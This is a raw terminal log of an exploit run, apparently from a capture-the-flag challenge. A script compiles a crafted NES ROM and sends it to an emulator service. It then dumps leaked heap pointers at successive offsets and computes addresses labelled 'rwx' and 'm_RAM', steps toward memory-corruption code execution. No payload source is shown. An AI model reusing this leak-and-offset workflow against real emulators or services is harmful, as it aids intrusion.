[x] Opening connection to localhost on port 1337
[x] Opening connection to localhost on port 1337: Trying ::1
[+] Opening connection to localhost on port 1337: Done
[*] Closed connection to localhost port 1337
cc65 -O -t c64 pwn.c
ca65 -t c64 pwn.s
b'[MainBus.cpp:12] Allocated m_RAM at: 0x555556cc7210\nFailed to create /home/pwn/.cache for shader cache (Permission denied)---disabling.\n[Cartridge.cpp:52] Reading ROM from path: /tmp/tmppkk6ow9m\n[Cartridge.cpp:70] Reading header, it dictates: \n[Cartridge.cpp:73] 16KB PRG-ROM Banks: 2\n[Cartridge.cpp:81] 8KB CHR-ROM Banks: 1\n[Cartridge.cpp:91] Name Table Mirroring: Vertical\n[Cartridge.cpp:95] Mapper #: 11\n[Cartridge.cpp:98] Extended (CPU) RAM: true\n[Cartridge.cpp:112] ROM is NTSC compatible.\n[Cartridge.cpp:121] Allocated m_PRG_ROM at: 0x5555570ba490\n[Cartridge.cpp:127] Allocated m_CHR_ROM at: 0x5555570c24a0\nError while enumerating udev devices\nSetting vertical sync not supported\n\xfa\r'
4096
2048
[*] 0x3dc000: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc010: 0x00007ffa3d806aa0 0x00007ffb3d806aa0
[*] 0x3dc020: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc030: 0x00007ffa3d5e1820 0x00007ffa3d5e1840
[*] 0x3dc040: 0x00007ffa3d5e1860 0x00007ffa3d5e1880
[*] 0x3dc050: 0x00007ffa3d5eb0c0 0x00007ffa3d5eb0c0
[*] 0x3dc060: 0x00007ffa3d5eb0e0 0x00007ffa3d5eb0e0
[*] 0x3dc070: 0x00007ffa3d5eb620 0x00007ffa3d806aa0
[*] 0x3dc080: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc090: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc0a0: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc0b0: 0x00007ffa3d5eb520 0x00007ffa3d806aa0
[*] 0x3dc0c0: 0x00007ffa3d5eb6a0 0x00007ffa3d5eb680
[*] 0x3dc0d0: 0x00007ffa3d5eb4c0 0x00007ffa3d5eb4a0
[*] 0x3dc0e0: 0x00007ffa3d5e27a0 0x00007ffa3d806aa0
[*] 0x3dc0f0: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc100: 0x00007ffa3d5eb6e0 0x00007ffa3d5eb6c0
[*] 0x3dc110: 0x00007ffa3d5eb500 0x00007ffa3d5eb4e0
[*] 0x3dc120: 0x00007ffa3d5eb600 0x00007ffa3d5eb660
[*] 0x3dc130: 0x00007ffa3d5eb640 0x00007ffa3d5eb560
[*] 0x3dc140: 0x00007ffa3d5eb540 0x00007ffa3d5eb5a0
[*] 0x3dc150: 0x00007ffa3d5eb580 0x00007ffa3d5eb5e0
[*] 0x3dc160: 0x00007ffa3d5eb5c0 0x00007ffa3d5eb480
[*] 0x3dc170: 0x00007ffa3d5eb480 0x00007ffa3d5e6fa0
[*] 0x3dc180: 0x00007ffa3d5e50a0 0x00007ffa3d5e6fa0
[*] 0x3dc190: 0x00007ffa3d5eabc0 0x00007ffa3d5e5080
[*] 0x3dc1a0: 0x00007ffa3d5e5080 0x00007ffa3d5e5080
[*] 0x3dc1b0: 0x00007ffa3d5e3100 0x00007ffa3d806aa0
[*] 0x3dc1c0: 0x00007ffa3d5e27e0 0x00007ffa3d5e27c0
[*] 0x3dc1d0: 0x00007ffa3d5eb100 0x00007ffa3d5eb100
[*] 0x3dc1e0: 0x00007ffa3d806aa0 0x00007ffa3d5e3720
[*] 0x3dc1f0: 0x00007ffa3d5e3720 0x00007ffa3d5e3740
[*] 0x3dc200: 0x00007ffa3d5e3740 0x00007ffa3d806aa0
[*] 0x3dc210: 0x00007ffa3d5e3800 0x00007ffa3d5e3800
[*] 0x3dc220: 0x00007ffa3d5e7260 0x00007ffa3d5e7260
[*] 0x3dc230: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc240: 0x00007ffa3d5e7720 0x00007ffa3d5e7720
[*] 0x3dc250: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc260: 0x00007ffa3d5e95a0 0x00007ffa3d5e5b20
[*] 0x3dc270: 0x00007ffa3d5e5b20 0x00007ffa3d5e95a0
[*] 0x3dc280: 0x00007ffa3d5e7280 0x00007ffa3d5e7280
[*] 0x3dc290: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc2a0: 0x00007ffa3d5e7740 0x00007ffa3d5e7740
[*] 0x3dc2b0: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc2c0: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc2d0: 0x00007ffa3d5e9720 0x00007ffa3d5e9740
[*] 0x3dc2e0: 0x00007ffa3d5ec4c0 0x00007ffa3d806aa0
[*] 0x3dc2f0: 0x00007ffa3d806aa0 0x00007ffa3d5e3200
[*] 0x3dc300: 0x00007ffa3d5e3200 0x00007ffa3d5e3220
[*] 0x3dc310: 0x00007ffa3d5e3220 0x00007ffa3d5e3240
[*] 0x3dc320: 0x00007ffa3d5e3240 0x00007ffa3d5e3260
[*] 0x3dc330: 0x00007ffa3d5e3260 0x00007ffa3d5ecee0
[*] 0x3dc340: 0x00007ffa3d5ecf00 0x00007ffa3d5e3280
[*] 0x3dc350: 0x00007ffa3d5e3280 0x00007ffa3d5e32a0
[*] 0x3dc360: 0x00007ffa3d5e32a0 0x00007ffa3d5e32c0
[*] 0x3dc370: 0x00007ffa3d5e32c0 0x00007ffa3d5e32e0
[*] 0x3dc380: 0x00007ffa3d5e32e0 0x00007ffa3d806aa0
[*] 0x3dc390: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc3a0: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc3b0: 0x00007ffa3d806aa0 0x00007ffa3d5e3300
[*] 0x3dc3c0: 0x00007ffa3d5e3300 0x00007ffa3d5e3320
[*] 0x3dc3d0: 0x00007ffa3d5e3320 0x00007ffa3d5e3340
[*] 0x3dc3e0: 0x00007ffa3d5e3340 0x00007ffa3d5e3360
[*] 0x3dc3f0: 0x00007ffa3d5e3360 0x00007ffa3d5ecf20
[*] 0x3dc400: 0x00007ffa3d5ecf40 0x00007ffa3d5e3380
[*] 0x3dc410: 0x00007ffa3d5e3380 0x00007ffa3d5e33a0
[*] 0x3dc420: 0x00007ffa3d5e33a0 0x00007ffa3d5e33c0
[*] 0x3dc430: 0x00007ffa3d5e33c0 0x00007ffa3d5e33e0
[*] 0x3dc440: 0x00007ffa3d5e33e0 0x00007ffa3d806aa0
[*] 0x3dc450: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc460: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc470: 0x00007ffa3d806aa0 0x00007ffa3d5e3400
[*] 0x3dc480: 0x00007ffa3d5e3400 0x00007ffa3d5e3420
[*] 0x3dc490: 0x00007ffa3d5e3420 0x00007ffa3d5e3440
[*] 0x3dc4a0: 0x00007ffa3d5e3440 0x00007ffa3d5e3460
[*] 0x3dc4b0: 0x00007ffa3d5e3460 0x00007ffa3d5ecf60
[*] 0x3dc4c0: 0x00007ffa3d5ecf80 0x00007ffa3d5e3480
[*] 0x3dc4d0: 0x00007ffa3d5e3480 0x00007ffa3d5e34a0
[*] 0x3dc4e0: 0x00007ffa3d5e34a0 0x00007ffa3d5e34c0
[*] 0x3dc4f0: 0x00007ffa3d5e34c0 0x00007ffa3d5e34e0
[*] 0x3dc500: 0x00007ffa3d5e34e0 0x00007ffa3d806aa0
[*] 0x3dc510: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc520: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc530: 0x00007ffa3d806aa0 0x00007ffa3d5e3500
[*] 0x3dc540: 0x00007ffa3d5e3500 0x00007ffa3d5e3520
[*] 0x3dc550: 0x00007ffa3d5e3520 0x00007ffa3d5e3540
[*] 0x3dc560: 0x00007ffa3d5e3540 0x00007ffa3d5e3560
[*] 0x3dc570: 0x00007ffa3d5e3560 0x00007ffa3d5ecfa0
[*] 0x3dc580: 0x00007ffa3d5ecfc0 0x00007ffa3d5e3580
[*] 0x3dc590: 0x00007ffa3d5e3580 0x00007ffa3d5e35a0
[*] 0x3dc5a0: 0x00007ffa3d5e35a0 0x00007ffa3d5e35c0
[*] 0x3dc5b0: 0x00007ffa3d5e35c0 0x00007ffa3d5e35e0
[*] 0x3dc5c0: 0x00007ffa3d5e35e0 0x00007ffa3d5eb120
[*] 0x3dc5d0: 0x00007ffa3d5eb120 0x00007ffa3d806aa0
[*] 0x3dc5e0: 0x00007ffa3d806aa0 0x00007ffa3d5e5f40
[*] 0x3dc5f0: 0x00007ffa3d5e5f60 0x00007ffa3d5e5f80
[*] 0x3dc600: 0x00007ffa3d5e5fa0 0x00007ffa3d5e5fc0
[*] 0x3dc610: 0x00007ffa3d5e5fe0 0x00007ffa3d5e6000
[*] 0x3dc620: 0x00007ffa3d5e6020 0x00007ffa3d5ec080
[*] 0x3dc630: 0x00007ffa3d5ebca0 0x00007ffa3d5ebcc0
[*] 0x3dc640: 0x00007ffa3d5ebc60 0x00007ffa3d5ebc80
[*] 0x3dc650: 0x00007ffa3d5ebf60 0x00007ffa3d5ebf80
[*] 0x3dc660: 0x00007ffa3d5ebfa0 0x00007ffa3d5ebfc0
[*] 0x3dc670: 0x00007ffa3d5ebfe0 0x00007ffa3d5ec000
[*] 0x3dc680: 0x00007ffa3d5ebdc0 0x00007ffa3d5ebde0
[*] 0x3dc690: 0x00007ffa3d5ebe00 0x00007ffa3d5ec560
[*] 0x3dc6a0: 0x00007ffa3d5ec580 0x00007ffa3d5ebd60
[*] 0x3dc6b0: 0x00007ffa3d5ebd80 0x00007ffa3d5ebd20
[*] 0x3dc6c0: 0x00007ffa3d5ebd40 0x00007ffa3d806aa0
[*] 0x3dc6d0: 0x00007ffa3d5ebe20 0x00007ffa3d5ebe40
[*] 0x3dc6e0: 0x00007ffa3d5ebe60 0x00007ffa3d806aa0
[*] 0x3dc6f0: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc700: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc710: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc720: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc730: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc740: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc750: 0x00007ffa3d806aa0 0x00007ffa3d806aa0
[*] 0x3dc760: 0x00007ffa3d806aa0 0x00007ffa3d5e7ec0
[*] 0x3dc770: 0x00007ffa3d5eb720 0x00007ffa3d5e8400
[*] 0x3dc780: 0x00007ffa3d5ecac0 0x00007ffa3d5e7ee0
[*] 0x3dc790: 0x00007ffa3d5eb760 0x00007ffa3d806aa0
[*] 0x3dc7a0: 0x00007ffa3d5eabe0 0x00007ffa3d5e7f00
[*] 0x3dc7b0: 0x00007ffa3d5eb740 0x00007ffa3d5ec660
[*] 0x3dc7c0: 0x00007ffa3d5e7f20 0x00007ffa3d5e7f40
[*] 0x3dc7d0: 0x00007ffa3d5e7f60 0x00007ffa3d5ec920
[*] 0x3dc7e0: 0x00007ffa3d5e7f80 0x00007ffa3d5e7fa0
[*] 0x3dc7f0: 0x00007ffa3d5ebbc0 0x00007ffa3d5e88e0
[*] rwx: 0xe183060301800
[*] m_RAM: 0x557e0078abc0
[*] m_RAM_rwx_off: 0xdc2b25fb76c40
[*] Closed connection to 91.107.157.58 port 3000
cc65 -O -t c64 pwn.c
ca65 -t c64 pwn.s
ca65 -t c64 pwn_asm.s
cl65 -o ../pwn.nes -t nes pwn.o pwn_asm.o
[*] offset: 0x3dc800
[x] Opening connection to 91.107.157.58 on port 3000
[x] Opening connection to 91.107.157.58 on port 3000: Trying 91.107.157.58
[+] Opening connection to 91.107.157.58 on port 3000: Done
b'[MainBus.cpp:12] Allocated m_RAM at: 0x555555dd7210\nFailed to create /home/pwn/.cache for shader cache (Permission denied)---disabling.\n[Cartridge.cpp:52] Reading ROM from path: /tmp/tmprl_s2o_w\n[Cartridge.cpp:70] Reading header, it dictates: \n[Cartridge.cpp:73] 16KB PRG-ROM Banks: 2\n[Cartridge.cpp:81] 8KB CHR-ROM Banks: 1\n[Cartridge.cpp:91] Name Table Mirroring: Vertical\n[Cartridge.cpp:95] Mapper #: 11\n[Cartridge.cpp:98] Extended (CPU) RAM: true\n[Cartridge.cpp:112] ROM is NTSC compatible.\n[Cartridge.cpp:121] Allocated m_PRG_ROM at: 0x5555561ca490\n[Cartridge.cpp:127] Allocated m_CHR_ROM at: 0x5555561d24a0\nError while enumerating udev devices\nSetting vertical sync not supported\n\xaa\r'
4096
2048
[*] 0x3dc800: 0x00007faa8c60e8e0 0x00007faa8c82caa0
[*] 0x3dc810: 0x00007faa8c60dfc0 0x00007fab8c611b60
[*] 0x3dc820: 0x00007faa8c611b80 0x00007faa8c611ba0
[*] 0x3dc830: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dc840: 0x00007faa8c60dfe0 0x00007faa8c82caa0
[*] 0x3dc850: 0x00007faa8c612420 0x00007faa8c612440
[*] 0x3dc860: 0x00007faa8c6123c0 0x00007faa8c6123e0
[*] 0x3dc870: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dc880: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dc890: 0x00007faa8c6125e0 0x00007faa8c82caa0
[*] 0x3dc8a0: 0x00007faa8c82caa0 0x00007faa8c612380
[*] 0x3dc8b0: 0x00007faa8c60e000 0x00007faa8c612300
[*] 0x3dc8c0: 0x00007faa8c60e020 0x00007faa8c610e00
[*] 0x3dc8d0: 0x00007faa8c82caa0 0x00007faa8c612640
[*] 0x3dc8e0: 0x00007faa8c612ae0 0x00007faa8c606300
[*] 0x3dc8f0: 0x00007faa8c82caa0 0x00007faa8c606980
[*] 0x3dc900: 0x00007faa8c6069a0 0x00007faa8c6069c0
[*] 0x3dc910: 0x00007faa8c6069e0 0x00007faa8c606a00
[*] 0x3dc920: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dc930: 0x00007faa8c606a20 0x00007faa8c612d20
[*] 0x3dc940: 0x00007faa8c612d40 0x00007faa8c606a40
[*] 0x3dc950: 0x00007faa8c606a60 0x00007faa8c606a80
[*] 0x3dc960: 0x00007faa8c606aa0 0x00007faa8c611140
[*] 0x3dc970: 0x00007faa8c611140 0x00007faa8c82caa0
[*] 0x3dc980: 0x00007faa8c82caa0 0x00007faa8c60c040
[*] 0x3dc990: 0x00007faa8c60c060 0x00007faa8c608ac0
[*] 0x3dc9a0: 0x00007faa8c60ebc0 0x00007faa8c82caa0
[*] 0x3dc9b0: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dc9c0: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dc9d0: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dc9e0: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dc9f0: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dca00: 0x00007faa8c82caa0 0x00007faa8c60f4e0
[*] 0x3dca10: 0x00007faa8c60f4e0 0x00007faa8c82caa0
[*] 0x3dca20: 0x00007faa8c60f500 0x00007faa8c60f500
[*] 0x3dca30: 0x00007faa8c82caa0 0x00007faa8c610680
[*] 0x3dca40: 0x00007faa8c6106a0 0x00007faa8c608800
[*] 0x3dca50: 0x00007faa8c611160 0x00007faa8c611160
[*] 0x3dca60: 0x00007faa8c611180 0x00007faa8c611180
[*] 0x3dca70: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dca80: 0x00007faa8c610020 0x00007faa8c607be0
[*] 0x3dca90: 0x00007faa8c82caa0 0x00007faa8c60c700
[*] 0x3dcaa0: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dcab0: 0x00007faa8c60c720 0x00007faa8c60c720
[*] 0x3dcac0: 0x00007faa8c82caa0 0x00007faa8c60c720
[*] 0x3dcad0: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dcae0: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dcaf0: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dcb00: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dcb10: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dcb20: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dcb30: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dcb40: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dcb50: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dcb60: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dcb70: 0x00007faa8c82caa0 0x00007faa8c60c7e0
[*] 0x3dcb80: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dcb90: 0x00007faa8c82caa0 0x00007faa8c608260
[*] 0x3dcba0: 0x00007faa8c608280 0x00007faa8c6082a0
[*] 0x3dcbb0: 0x00007faa8c82caa0 0x00007faa8c608220
[*] 0x3dcbc0: 0x00007faa8c608240 0x00007faa8c82caa0
[*] 0x3dcbd0: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dcbe0: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dcbf0: 0x00007faa8c82caa0 0x00007faa8c6081e0
[*] 0x3dcc00: 0x00007faa8c608200 0x00007faa8c82caa0
[*] 0x3dcc10: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dcc20: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dcc30: 0x00007faa8c6081c0 0x00007faa8c82caa0
[*] 0x3dcc40: 0x00007faa8c82caa0 0x00007faa8c609820
[*] 0x3dcc50: 0x00007faa8c609820 0x00007faa8c609820
[*] 0x3dcc60: 0x00007faa8c609820 0x00007faa8c609840
[*] 0x3dcc70: 0x00007faa8c609840 0x00007faa8c609840
[*] 0x3dcc80: 0x00007faa8c609840 0x00007faa8c609860
[*] 0x3dcc90: 0x00007faa8c609860 0x00007faa8c609880
[*] 0x3dcca0: 0x00007faa8c609880 0x00007faa8c6113e0
[*] 0x3dccb0: 0x00007faa8c6113e0 0x00007faa8c611400
[*] 0x3dccc0: 0x00007faa8c611400 0x00007faa8c6078a0
[*] 0x3dccd0: 0x00007faa8c60eae0 0x00007faa8c6111a0
[*] 0x3dcce0: 0x00007faa8c6111a0 0x00007faa8c82caa0
[*] 0x3dccf0: 0x00007faa8c82caa0 0x00007faa8c6078c0
[*] 0x3dcd00: 0x00007faa8c82caa0 0x00007faa8c608ae0
[*] 0x3dcd10: 0x00007faa8c6109c0 0x00007faa8c6109c0
[*] 0x3dcd20: 0x00007faa8c82caa0 0x00007faa8c6111c0
[*] 0x3dcd30: 0x00007faa8c6111c0 0x00007faa8c6078e0
[*] 0x3dcd40: 0x00007faa8c607e40 0x00007faa8c608cc0
[*] 0x3dcd50: 0x00007faa8c60f520 0x00007faa8c60f520
[*] 0x3dcd60: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dcd70: 0x00007faa8c608820 0x00007faa8c607c00
[*] 0x3dcd80: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dcd90: 0x00007faa8c611460 0x00007faa8c611460
[*] 0x3dcda0: 0x00007faa8c611460 0x00007faa8c611460
[*] 0x3dcdb0: 0x00007faa8c82caa0 0x00007faa8c60afc0
[*] 0x3dcdc0: 0x00007faa8c60afc0 0x00007faa8c6101a0
[*] 0x3dcdd0: 0x00007faa8c608c60 0x00007faa8c608c60
[*] 0x3dcde0: 0x00007faa8c82caa0 0x00007faa8c60c960
[*] 0x3dcdf0: 0x00007faa8c60c960 0x00007faa8c82caa0
[*] 0x3dce00: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dce10: 0x00007faa8c60b200 0x00007faa8c60b220
[*] 0x3dce20: 0x00007faa8c60b240 0x00007faa8c60b260
[*] 0x3dce30: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dce40: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dce50: 0x00007faa8c610e60 0x00007faa8c82caa0
[*] 0x3dce60: 0x00007faa8c82caa0 0x00007faa8c60b280
[*] 0x3dce70: 0x00007faa8c60b2a0 0x00007faa8c60b2c0
[*] 0x3dce80: 0x00007faa8c60b2e0 0x00007faa8c82caa0
[*] 0x3dce90: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dcea0: 0x00007faa8c82caa0 0x00007faa8c610e80
[*] 0x3dceb0: 0x00007faa8c82caa0 0x00007faa8c82caa0
[*] 0x3dcec0: 0x00007faa8c610120 0x00007faa8c610140
[*] 0x3dced0: 0x00007faa8c610160 0x00007faa8c610180
[*] 0x3dcee0: 0x00007faa8c60b200 0x00007faa8c60b220
[*] 0x3dcef0: 0x00007faa8c60b240 0x00007faa8c60b260
[*] 0x3dcf00: 0x00007faa8c60c980 0x00007faa8c82caa0
[*] 0x3dcf10: 0x00007faa8c60c980 0x00007faa8c60f8c0
[*] 0x3dcf20: 0x00007faa8c60f8e0 0x00007faa8c82caa0
[*] 0x3dcf30: 0x00007faa8c60b300 0x00007faa8c82caa0
[*] 0x3dcf40: 0x00007faa8c60ed60 0x00007faa8c60ed60
[*] 0x3dcf50: 0x00007faa8c60ed80 0x00007faa8c60ed80
[*] 0x3dcf60: 0x00007faa8c60eda0 0x00007faa8c60eda0
[*] 0x3dcf70: 0x00007faa8c60edc0 0x00007faa8c60edc0
[*] 0x3dcf80: 0x00007faa8c60ede0 0x00007faa8c60e4a0
[*] 0x3dcf90: 0x00007faa8c60e4a0 0x00007faa8c60e4c0
[*] 0x3dcfa0: 0x00007faa8c60e4c0 0x00007faa8c60ede0
[*] 0x3dcfb0: 0x00007faa8c60ee00 0x00007faa8c60ee00
[*] 0x3dcfc0: 0x00007faa8c60ee20 0x00007faa8c60e4e0
[*] 0x3dcfd0: 0x00007faa8c60e4e0 0x00007faa8c60e500
[*] 0x3dcfe0: 0x00007faa8c60e500 0x00007faa8c60ee20
[*] 0x3dcff0: 0x00007faa8c60ee40 0x00007faa8c60ee40
[*] rwx: 0xe183060301800
[*] m_RAM: 0x557e0078abc0
[*] m_RAM_rwx_off: 0xdc2b25fb76c40
[*] Closed connection to 91.107.157.58 port 3000
cc65 -O -t c64 pwn.c
ca65 -t c64 pwn.s
ca65 -t c64 pwn_asm.s
cl65 -o ../pwn.nes -t nes pwn.o pwn_asm.o
[*] offset: 0x3dd000
[x] Opening connection to 91.107.157.58 on port 3000
[x] Opening connection to 91.107.157.58 on port 3000: Trying 91.107.157.58
[+] Opening connection to 91.107.157.58 on port 3000: Done
b'[MainBus.cpp:12] Allocated m_RAM at: 0x555555a09210\nFailed to create /home/pwn/.cache for shader cache (Permission denied)---disabling.\n[Cartridge.cpp:52] Reading ROM from path: /tmp/tmpav5g83ne\n[Cartridge.cpp:70] Reading header, it dictates: \n[Cartridge.cpp:73] 16KB PRG-ROM Banks: 2\n[Cartridge.cpp:81] 8KB CHR-ROM Banks: 1\n[Cartridge.cpp:91] Name Table Mirroring: Vertical\n[Cartridge.cpp:95] Mapper #: 11\n[Cartridge.cpp:98] Extended (CPU) RAM: true\n[Cartridge.cpp:112] ROM is NTSC compatible.\n[Cartridge.cpp:121] Allocated m_PRG_ROM at: 0x555555dfc490\n[Cartridge.cpp:127] Allocated m_CHR_ROM at: 0x555555e044a0\nError while enumerating udev devices\nSetting vertical sync not supported\n\x82\r'
4096
2048
[*] 0x3dd000: 0x00007f82e91e1e60 0x00007f82e91e1e60
[*] 0x3dd010: 0x00007f82e91e1e80 0x00007f83e91e1e80
[*] 0x3dd020: 0x00007f82e91e1ea0 0x00007f82e91e1ea0
[*] 0x3dd030: 0x00007f82e91e1ec0 0x00007f82e91e1ec0
[*] 0x3dd040: 0x00007f82e91e1ee0 0x00007f82e91e1520
[*] 0x3dd050: 0x00007f82e91e1520 0x00007f82e91e1540
[*] 0x3dd060: 0x00007f82e91e1540 0x00007f82e91e1ee0
[*] 0x3dd070: 0x00007f82e91e1f00 0x00007f82e91e1f00
[*] 0x3dd080: 0x00007f82e91e1f20 0x00007f82e91e1560
[*] 0x3dd090: 0x00007f82e91e1560 0x00007f82e91e1580
[*] 0x3dd0a0: 0x00007f82e91e1580 0x00007f82e91e1f20
[*] 0x3dd0b0: 0x00007f82e91e1f40 0x00007f82e91e1f40
[*] 0x3dd0c0: 0x00007f82e91e1f60 0x00007f82e91e1f60
[*] 0x3dd0d0: 0x00007f82e91e1f80 0x00007f82e91e1f80
[*] 0x3dd0e0: 0x00007f82e91e1fa0 0x00007f82e91e1fa0
[*] 0x3dd0f0: 0x00007f82e91e1fc0 0x00007f82e91e1fc0
[*] 0x3dd100: 0x00007f82e91e1fe0 0x00007f82e91e15a0
[*] 0x3dd110: 0x00007f82e91e15a0 0x00007f82e91e15c0
[*] 0x3dd120: 0x00007f82e91e15c0 0x00007f82e91e1fe0
[*] 0x3dd130: 0x00007f82e91e2000 0x00007f82e91e2000
[*] 0x3dd140: 0x00007f82e91e2020 0x00007f82e91e15e0
[*] 0x3dd150: 0x00007f82e91e15e0 0x00007f82e91e1600
[*] 0x3dd160: 0x00007f82e91e1600 0x00007f82e91e2020
[*] 0x3dd170: 0x00007f82e91e2040 0x00007f82e91e2040
[*] 0x3dd180: 0x00007f82e91e2060 0x00007f82e91e2060
[*] 0x3dd190: 0x00007f82e91e2080 0x00007f82e91e2080
[*] 0x3dd1a0: 0x00007f82e91e20a0 0x00007f82e91e20a0
[*] 0x3dd1b0: 0x00007f82e91e20c0 0x00007f82e91e20c0
[*] 0x3dd1c0: 0x00007f82e91e20e0 0x00007f82e91e1620
[*] 0x3dd1d0: 0x00007f82e91e1620 0x00007f82e91e1640
[*] 0x3dd1e0: 0x00007f82e91e1640 0x00007f82e91e20e0
[*] 0x3dd1f0: 0x00007f82e91e2100 0x00007f82e91e2100
[*] 0x3dd200: 0x00007f82e91e2120 0x00007f82e91e1660
[*] 0x3dd210: 0x00007f82e91e1660 0x00007f82e91e1680
[*] 0x3dd220: 0x00007f82e91e1680 0x00007f82e91e2120
[*] 0x3dd230: 0x00007f82e91e2140 0x00007f82e91e2140
[*] 0x3dd240: 0x00007f82e91e0640 0x00007f82e93ffaa0
[*] 0x3dd250: 0x00007f82e93ffaa0 0x00007f82e91e0660
[*] 0x3dd260: 0x00007f82e93ffaa0 0x00007f82e93ffaa0
[*] 0x3dd270: 0x00007f82e91e2160 0x00007f82e91e2160
[*] 0x3dd280: 0x00007f82e91e2180 0x00007f82e91e2180
[*] 0x3dd290: 0x00007f82e91e21a0 0x00007f82e91e21a0
[*] 0x3dd2a0: 0x00007f82e91e21c0 0x00007f82e91e21c0
[*] 0x3dd2b0: 0x00007f82e91e21e0 0x00007f82e91e21e0
[*] 0x3dd2c0: 0x00007f82e91e2200 0x00007f82e91e2200
[*] 0x3dd2d0: 0x00007f82e91e2220 0x00007f82e91e2220
[*] 0x3dd2e0: 0x00007f82e91e2240 0x00007f82e91e2240
[*] 0x3dd2f0: 0x00007f82e91e2260 0x00007f82e91e2260
[*] 0x3dd300: 0x00007f82e91e2280 0x00007f82e91e2280
